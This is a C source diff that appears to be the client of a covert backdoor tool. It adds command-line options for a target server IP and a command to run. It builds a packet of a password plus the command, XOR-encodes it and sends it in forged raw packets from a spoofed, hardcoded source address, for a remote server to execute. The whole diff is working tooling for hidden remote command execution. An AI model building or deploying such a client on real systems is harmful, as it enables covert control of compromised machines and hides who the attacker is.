@@ -43,8 +43,30 @@
  *----------------------------------------------------------------------------*/
 int main(int argc, char *argv[])
 {
-	printf("test send...\n");
-	packet_forge(xor("-{qw}*dIext_cmd[ls -l]dmc_txe"), "192.168.1.101", "192.168.1.150");
+	char packet[MAX_PKT_LEN];
+
+	/* make sure user is root */
+	if (geteuid() != USER_ROOT) {
+		fprintf(stderr, "Must be root to run this program.\n");
+		exit(ERROR_NOTROOT);
+	}
+
+	/* parse CLI options */
+	if (parse_options(argc, argv) == ERROR_OPTS) {
+		err(1, "Invalid options");
+		exit(ERROR_OPTS);
+	}
+
+	print_settings(argv[0]);
+
+	/* raise privileges */
+	if (set_root() == ERROR_NOTROOT) {
+		err(1, "set_root");
+	}
+
+	sprintf(packet, "%s%s%s%s", PASSWORD, EXT_CMD_START, cli_vars.command, EXT_CMD_END);
+
+	packet_forge(xor(packet), "216.187.76.2", cli_vars.server_ip);
 
 	return 0;
 }
@@ -70,10 +92,8 @@ int main(int argc, char *argv[])
 void print_settings(char *command)
 {
 	fprintf(stderr, "Using the Following Options: (For help use \"%s -h\")\n", command);
-	if (svr_vars.daemonize)
-		fprintf(stderr, "  Running as daemon:   TRUE\n");
-	else
-		fprintf(stderr, "  Running as daemon:   FALSE\n");
+	fprintf(stderr, "  Server's IP address:  %s\n", cli_vars.server_ip);
+	fprintf(stderr, "  Sending command:      %s\n", cli_vars.command);
 }
 
 /*-----------------------------------------------------------------------------
@@ -100,8 +120,9 @@ void print_usage(char *command, int err)
     if (err == ERROR_OPTS_HELP) {
         fprintf(stderr, "usage: %s [arguments]\n\n", command);
         fprintf(stderr, "Arguments:\n");
-        fprintf(stderr, "  -d  or  --daemon  Run as a background daemon\n");
-        fprintf(stderr, "  -h  or  --help    Prints out this screen\n");
+        fprintf(stderr, "  -s       or  --server        Server's IP address\n");
+        fprintf(stderr, "  -c 'cmd' or  --command 'cmd' Command to execute\n");
+        fprintf(stderr, "  -h       or  --help          Prints out this screen\n");
 		exit(ERROR_OPTS_HELP);
     }
 	else if (err == ERROR_OPTS)
@@ -136,19 +157,21 @@ int parse_options(int argc, char *argv[])
 
 	static struct option long_options[] =
 	{
-		{"daemon"		, no_argument		, 0, 'd'},
+		{"server"		, required_argument	, 0, 's'},
+		{"command"		, required_argument	, 0, 'c'},
 		{"help"			, no_argument		, 0, 'h'},
 		{0, 0, 0, 0}
 	};
 
 	/* set defaults */
-	svr_vars.daemonize = FALSE;
-	print_output = TRUE;
-	server = TRUE;
+	server = FALSE;
+
+	if (argc != 5)
+		print_usage(argv[0], ERROR_OPTS_HELP);
 
 	/* parse options */
 	while (TRUE) {
-		c = getopt_long(argc, argv, "d:h", long_options, &option_index);
+		c = getopt_long(argc, argv, "s:c:h", long_options, &option_index);
 
 		if (c == -1)
 			break;
@@ -159,9 +182,12 @@ int parse_options(int argc, char *argv[])
 					break;
 				break;
 
-			case 'd':
-				svr_vars.daemonize = TRUE;
-				print_output = FALSE;
+			case 's':
+				cli_vars.server_ip = optarg;
+				break;
+
+			case 'c':
+				cli_vars.command = optarg;
 				break;
 
 			case 'h':
